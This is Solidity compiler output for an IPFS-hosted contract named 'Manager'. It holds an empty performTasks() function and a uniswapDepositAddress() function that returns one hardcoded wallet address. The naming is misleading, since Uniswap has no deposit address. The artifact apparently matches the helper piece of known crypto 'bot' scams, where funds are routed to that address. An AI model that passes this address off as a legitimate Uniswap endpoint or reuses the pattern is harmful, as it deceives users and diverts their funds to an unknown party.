{
	"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y": {
		"Manager": {
			"abi": [
				{
					"inputs": [],
					"name": "performTasks",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "uniswapDepositAddress",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":25:211  contract Manager {... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":25:211  contract Manager {... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":25:211  contract Manager {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":25:211  contract Manager {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0c0f93a1\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xfeae9ad3\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":45:86  function performTasks() public {... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":89:209  function uniswapDepositAddress() public pure returns (address) {... */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":45:86  function performTasks() public {... */\n    tag_6:\n      jump\t// out\n        /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":89:209  function uniswapDepositAddress() public pure returns (address) {... */\n    tag_8:\n        /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":143:150  address */\n      0x00\n        /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":163:205  0x504110f372eF81284B9082840a06BD0457B814a3 */\n      0x504110f372ef81284b9082840a06bd0457b814a3\n        /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":156:205  return 0x504110f372eF81284B9082840a06BD0457B814a3 */\n      swap1\n      pop\n        /* \"ipfs://Qmahn1HypeALxWkWY28WX5L5fRzbyBfREAk4LQuVRm768Y\":89:209  function uniswapDepositAddress() public pure returns (address) {... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220f9f08d50ff131918f1b74ecc9701afa7b49c12fa16ea9dca16eb0fef8dc2a85064736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060db8061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a1146037578063feae9ad314603f575b600080fd5b603d6087565b005b60456089565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b565b600073504110f372ef81284b9082840a06bd0457b814a390509056fea2646970667358221220f9f08d50ff131918f1b74ecc9701afa7b49c12fa16ea9dca16eb0fef8dc2a85064736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xDB DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xFEAE9AD3 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH20 0x504110F372EF81284B9082840A06BD0457B814A3 SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF9 CREATE DUP14 POP SELFDESTRUCT SGT NOT XOR CALL 0xB7 0x4E 0xCC SWAP8 ADD 0xAF 0xA7 0xB4 SWAP13 SLT STATICCALL AND 0xEA SWAP14 0xCA AND 0xEB 0xF 0xEF DUP14 0xC2 0xA8 POP PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "43800",
						"executionCost": "93",
						"totalCost": "43893"
					},
					"external": {
						"performTasks()": "122",
						"uniswapDepositAddress()": "225"
					}
				},
				"methodIdentifiers": {
					"performTasks()": "0c0f93a1",
					"uniswapDepositAddress()": "feae9ad3"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}